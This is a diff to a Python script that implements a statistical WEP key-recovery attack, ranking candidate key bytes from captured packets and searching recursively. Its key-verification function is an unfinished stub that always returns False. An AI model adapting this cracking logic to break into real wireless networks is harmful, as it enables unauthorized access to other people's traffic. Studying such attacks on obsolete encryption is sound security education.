@@ -110,27 +110,40 @@ def weak_iv(iv, wep_key_len):
     return False
 
 
-def weak_iv_table():
-    return
-
-
-def check_key(key):
-    return
-
-def crack_wep(keysize, packets):
+# TODO
+def check_key(wep_key, full_packets):
     """
-    Analyzes the packets  and for each one it
+    Uses the iv from the packet and the given WEP key to decrypt each packet.
+    Then calculate the checksum and compares it to the decrypted one.
+    If each checksum matches, we have a winner.
+
+    :param wep_key: a full 5 or 13 byte wep key
+    :param full_packets: a list of complete wep packets
+    :return: True if the key is correct
     """
-    key = [0] * keysize
-    for keybyte in range(keysize):
-        counts = [0] * 256
-        for p in packets:
-            # construct key counts
-            counts[simulate_resolved(keybyte, p[0], p[1], key)] += 1
-        # key[keybyte] = index of max(counts)
-        key[keybyte] = max(enumerate(counts), key=lambda x: x[1])[0]
-    return key
+    return False
 
 
-def main():
-    print("WEPcracker")
+def crack_wep(wep_key_len, full_packets,  short_packets, wep_key, b):
+    if wep_key_len == b:
+        return check_key(wep_key, full_packets)
+    counts = [0] * 256
+    for p in short_packets:
+        # construct byte counts
+        counts[simulate_resolved(b, p[0], p[1], wep_key)] += 1
+    # Try the top 10 most frequent byte values
+    for byte in sorted(range(len(counts)), key=counts.__getitem__, reverse=True)[0:10]:
+        wep_key[b] = byte
+        if crack_wep(wep_key_len, full_packets, short_packets, wep_key, b + 1):
+            return True
+    return False
+
+
+def main(wep_key_len, full_packets,  short_packets):
+    wep_key = [0] * wep_key_len
+
+    if crack_wep(wep_key_len, full_packets,  short_packets, wep_key, 0):
+        print "Success! WEP key: %s" % wep_key
+        return wep_key
+    else:
+        print "Failed! Try again with more than %d packets." % len(short_packets)
